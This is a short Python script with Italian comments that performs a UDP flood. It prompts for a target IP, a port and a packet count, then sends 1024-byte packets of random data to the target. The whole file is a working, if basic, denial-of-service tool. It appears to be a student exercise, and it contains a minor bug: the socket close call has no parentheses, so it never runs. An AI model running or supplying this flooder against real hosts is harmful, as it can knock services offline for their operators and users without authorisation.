#   UDP flood su una macchina che aperta per connessioni UDP
#   Importare lbreria socket per l'invio dei pacchetti
#   Importare libreria random per generare dati casuali

import socket
import random

IP= input("Ip macchina target: ")
Porta = int(input("Porta macchina target: "))
npacchetti = int(input("Numero pachetti: "))

#Socket UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #IPV4 + #TIPOLOGIA UDP
dimensione_pacchetto= 1024 #numero byte

def generazione_pack(dimensione):
    return bytes(random.getrandbits(8) for _ in range(dimensione))


#Messaggio sto inviando..
print(f"Sto inviando i pacchetti a {IP} sulla porta {Porta}")

#Invio pacchetto
for _ in range(npacchetti):
    sock.sendto(generazione_pack(dimensione_pacchetto), (IP, Porta)) #(bytes [address])
 
#Messaggio OK
print("Pacchetto inviato")

sock.close


